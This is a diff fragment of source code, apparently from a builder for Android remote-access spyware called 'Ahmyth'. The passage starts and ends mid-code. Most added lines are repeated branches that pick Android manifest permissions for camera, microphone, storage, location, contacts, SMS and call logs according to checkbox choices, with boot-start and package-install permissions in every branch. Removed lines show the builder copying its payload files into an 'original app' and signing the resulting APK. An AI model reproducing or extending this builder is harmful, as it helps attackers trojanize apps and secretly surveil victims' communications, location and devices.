+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>         ` 
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>         ` 
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>         ` 
+        }
 
-              $appCtrl.Log('Signing ' + CONSTANTS.apkName + '...');
-              var signApk = exec('java -jar "' + CONSTANTS.signApkJar + '" -a "' + path.join(outputPath, CONSTANTS.apkName) + '"',
-                  (error, stdout, stderr) => {
-                      if (error !== null) {
-                          $appCtrl.Log('Signing Failed', CONSTANTS.logStatus.FAIL);
-                          return;
-                      }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>         ` 
+        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>         ` 
+        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>         `
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>         ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>         ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>         ` 
+        }
 
 
-                      fs.unlink(path.join(outputPath, CONSTANTS.apkName), (err) => {
-                          if (err) throw err;
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>         ` 
+        }
 
-                          $appCtrl.Log('Apk built successfully', CONSTANTS.logStatus.SUCCESS);
-                          $appCtrl.Log("The apk has been built on " + path.join(outputPath), CONSTANTS.logStatus.SUCCESS);
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         `
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         ` 
+        }
 
-                      });
-                  });
-          });
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         ` 
+        }
 
-  }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+            `
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>         ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>         `
+        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+            `
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+            ` 
+        }
+        //if three are checked 
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+
+            ` 
+        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>         ` 
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+            `
+        }
 
 
-  // function to copy ahmyth source files to the orginal app
-  // and if success go to generate the apk
-  $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
 
-      $appCtrl.Log("Copying Ahmyth files to orginal app...");
-      fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, "smali"), (error) => {
-          if (error) {
-              $appCtrl.Log('Copying Failed', CONSTANTS.logStatus.FAIL);
-              return;
-          }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>         `
+        }
 
-          $appCtrl.GenerateApk(apkFolder);
-      })
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
+        }
 
-  };
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
